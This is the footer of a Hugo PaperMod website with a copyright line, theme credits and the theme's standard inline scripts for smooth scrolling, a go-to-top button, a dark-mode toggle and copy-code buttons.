<span>&copy; 2017-2024 <a href=/policies>Policies</a><br>Site by <a href=//localhost:1313/>Mr Ash Co</a></span>
<span>• Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>
x
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>